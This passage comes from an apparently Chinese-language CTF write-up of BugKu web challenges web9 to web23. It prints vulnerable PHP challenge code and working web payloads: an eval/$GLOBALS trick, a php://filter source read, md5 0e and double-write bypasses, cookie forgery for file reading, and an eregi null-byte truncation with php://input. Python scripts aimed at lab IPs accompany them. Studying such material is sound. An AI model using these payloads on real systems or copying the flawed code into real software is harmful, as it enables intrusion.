class="comment">//利用了原来var_dump留下来的 );</span></span><br></pre></td></tr></table></figure><blockquote><p><code>print_r</code>和<code>var_dump</code>都可以用来打印flag.php</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211001515.png"></p><h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\w+$/&quot;</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正则的意思是只能输入大小写字母和0-9数字和下划线，<code>eval(&quot;var_dump($$args);&quot;);</code>中的<code>$$args</code>明示<code>$args</code>是一个数组，所以用<code>GLOBALS</code>超级全局变量来解</p><blockquote><p><code>$GLOBALS</code>用来存储全局变量，全局变量的值在<code>$GLOBALS</code>里面是一个键值，即全局变量可以通过自己的变量名在<code>$GLOBALS</code>找到相对应的值</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211004423.png"></p><h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>抓包重放，响应头里看到flag</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211005101.png"></p><h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p>扫目录发现<code>shell.php</code>，爆破<code>shell.php</code>得到密码<code>hack</code>，拿到flag</p><h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p>F12发现<code>dGVzdDEyMw==</code>，解base64得<code>test123</code>，猜测账号<code>admin</code>，加上<code>x-forwarded-for:127.0.0.1</code>即可</p><h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p>题目提示查看源码，发现源码<code>&lt;script&gt;</code>标签里有URL编码，<br> p1解码为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkSubmit</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> a=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;undefined&quot;</span>!=<span class="keyword">typeof</span> a)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;67d709b2b1234</span></span><br></pre></td></tr></table></figure><p>p2解码为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">aa648cf6e87a7114f1<span class="string">&quot;==a.value)</span></span><br><span class="line"><span class="string">return!0;</span></span><br><span class="line"><span class="string">alert(&quot;</span><span class="title class_">Error</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">a.focus();</span></span><br><span class="line"><span class="string">return!1</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">document.getElementById(&quot;</span>levelQuest<span class="string">&quot;).onsubmit=checkSubmit;12345678</span></span><br></pre></td></tr></table></figure><p>最后的eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));解码为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">&#x27;54aa2&#x27;</span> + p2));<span class="number">1</span></span><br></pre></td></tr></table></figure><p>根据eval()执行代码块的意思拼接出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function checkSubmit()&#123;</span><br><span class="line">var a=document.getElementById(&quot;password&quot;);</span><br><span class="line">//getElementById根据指定的 id 属性值得到对象</span><br><span class="line">if(&quot;undefined&quot;!=typeof a)&#123;</span><br><span class="line">if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</span><br><span class="line">return!0;</span><br><span class="line">alert(&quot;Error&quot;);</span><br><span class="line">a.focus();</span><br><span class="line">return!1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</span><br><span class="line">//onsubmit 事件会在表单中的确认按钮被点击时发生12345678910111213</span><br></pre></td></tr></table></figure><p>判断变量a的值是否等于67d709b2b54aa2aa648cf6e87a7114f1<br> 好像直接输入字符串提交就可以得到flag。</p><h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><p><code>php://filter/read=convert.base64-encode/resource=</code></p><p>伪协议读源码，解码得到flag</p><h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><p>burpsuite 一把梭 密码1****</p><h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><p><code>index.php.bak</code>拿到php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>随便扫一眼，非常简单的<code>str_replace</code>双写绕过 + <code>md5</code>弱比较 0e 绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</span><br></pre></td></tr></table></figure><h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><p>sqlmap 一把梭</p><h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.246.176:14600/&#x27;</span></span><br><span class="line">response = requests.session()</span><br><span class="line">re = response.get(url=url).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">elements = etree.HTML(re).xpath(<span class="string">&#x27;//div/text()&#x27;</span>)[<span class="number">0</span>][<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">result = <span class="built_in">eval</span>(elements)</span><br><span class="line"><span class="built_in">print</span>(result,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>:result</span><br><span class="line">&#125;</span><br><span class="line">flag = response.post(url=url,data=data).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># flag_x = etree.HTML(flag)</span></span><br><span class="line"><span class="comment"># # print(etree.tostring(flag_x,encoding=&#x27;utf-8&#x27;).decode(&#x27;utf-8&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><p>burpsuite抓包</p><p><code>OK ,now you have to post the margin what you find</code>，得知需要以<code>POST</code>的请求方法把<code>margin</code>传过去，<code>margin</code>的内容应该是抓包得到头里面的base64的<code>flag</code>再base64解码一次，手动解再用burpsuite重放过去不行，所以写了脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.246.176:11914/&#x27;</span></span><br><span class="line">r = requests.session()                                    <span class="comment">#获取session。</span></span><br><span class="line">q = r.get(url)                                                 <span class="comment">#以get方式去请求</span></span><br><span class="line">text = q.headers[<span class="string">&#x27;flag&#x27;</span>]                                  <span class="comment">#获取返回数据包中flag字段</span></span><br><span class="line">data = base64.b64decode(base64.b64decode(text)[-<span class="number">8</span>:])  <span class="comment">#第一次把flag中的字段进行base64解码，然后取解码后的后8位进行第二次base64解码</span></span><br><span class="line">data=&#123;<span class="string">&#x27;margin&#x27;</span>:data&#125;                                   <span class="comment">#获取margin这个参数，</span></span><br><span class="line">r2 = r.post(url,data = data)                        <span class="comment">#使用post去请求</span></span><br><span class="line"><span class="built_in">print</span>(r2.text)                                            <span class="comment">#返回信息</span></span><br></pre></td></tr></table></figure><h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><p>url 中<code>line=&amp;filename=a2V5cy50eHQ=</code>得到关键信息，<code>filename</code>传参文件名字经过base64编码后的东西，<code>line</code>是具体到哪一行，没有修改<code>line</code>的值时候，试了一下去读<code>index.php</code>的内容，得到一个<code>&lt;?php</code>，由此猜测而来</p><p>上脚本跑出index.php的所有代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    url = <span class="string">&quot;http://114.67.246.176:16017/index.php?line=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span></span><br><span class="line">    s = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(s.text)</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单审一下，逻辑就是当 <code>cookie</code>的值等于<code>margin</code>时，会给<code>file_list[2]</code>数组赋值为<code>keys.php</code>，然后<code>filename</code>是从<code>file_list</code>这个数组里面找，所以思路就是伪造<code>cookie</code>等于<code>margin</code>让<code>file_list</code>包含进<code>keys.php</code>，然后跟读<code>index.php</code>一样去读取<code>keys.php</code></p><h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><p>一堆套娃解码</p><p>访问<code>1p.html</code>拿到第一层的base64</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Words</span> =<span class="string">&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot;</span> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OutWord</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">NewWords</span>;</span><br><span class="line"><span class="title class_">NewWords</span> = <span class="built_in">unescape</span>(<span class="title class_">Words</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title class_">NewWords</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="title class_">OutWord</span>();</span><br></pre></td></tr></table></figure><p>第二层解那段base64，又拿到一段url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure><p>第三层再解一次url，拿到php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">require(&quot;</span>f4l2a3g.txt<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">print &quot;</span><span class="keyword">never</span> <span class="keyword">never</span> <span class="keyword">never</span> give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>审一波源码</p><ol><li><code>id</code>要求为<code>0</code>，但是下面要求<code>id</code>为整数0才能加载</li><li><code>$a</code>要求服务器端存在一个文件名，文件内容是<code>&quot;bugku is a nice plateform!&quot;</code></li><li>要求<code>$b</code>的第一个字符既等于字符’4’，又不等于整数4</li><li><code>$a</code>中不含 <strong><code>.</code></strong></li><li>字符串<code>1114</code>要与字符串<code>111</code>连接变量 <code>$b</code> 的第一个字符构成的正则表达式匹配</li><li><code>$b</code>长度大于5</li></ol><p>对应的解题思路：</p><p><strong><code>file_get_contents()</code></strong> 老熟人了，直接<code>php://input</code></p><p><strong><code>ereg()</code>和<code>eregi()</code>有空字符截断漏洞，在参数与中的正则表达式和待匹配字符串中遇到了空格，则截断并丢弃后面的数据</strong></p><p>函数原型：<code>int eregi(string pattern, string string, [array regs])</code>       </p><p>成功返回true，第一个是搜索规则，第二个是被搜索字符串<br> 在一个字符串搜索指定的模式的字符串。搜索不区分大小写。<code>eregi()</code>可以特别有用的检查有效性字符串,如密码，可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。</p><p>在本题里面<code>eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)</code> ，即111拼接上<code>substr($b,0,1)</code>，之后与”1114”比较，只要让”111”后面拼接上一个空格即<code>\x00</code>  就可以让<code>eregi</code>对后面截断，结果就是”111”等于”1114”。这里可以构造<code>$b=&quot;\x00abcdef&quot;</code> 满足长度大于5即可</p><p>直接让<code>$b=\x00abcdef</code>不得行，写到url里还要将\x改成%，在请求过程中会自动进行<code>URL编码</code>，在提交请求时导致请求头截断。这个具体过程是因为，如果填的是<code>\x00</code>，在url编码阶段就会被截断<code>$b</code>还没被传送至php后台时已经成为了空（即<code>$b=&#39;&#39;</code>），到了后台<code>$b</code>为空，就不符合要求了。所以直接用python把URL编码的过程手动做了，就不会被截断，就能顺利将数据传送至后台</p><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;http://114.67.246.176:13237/hello.php/hello.php?id=aa&amp;b=%00abcdef&amp;a=php://input&quot;</span></span><br><span class="line">mysession = requests.session()</span><br><span class="line"><span class="comment"># headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span></span><br><span class="line"><span class="comment"># b = &#123;&#x27;value&#x27;: &#x27;bugku is a nice plateform!&#x27;&#125;</span></span><br><span class="line">r = mysession.get(payload, data=<span class="string">&#x27;bugku is a nice plateform!&#x27;</span>)  <span class="comment"># 不用构造成json格式了，直接发送data参数就行了</span></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 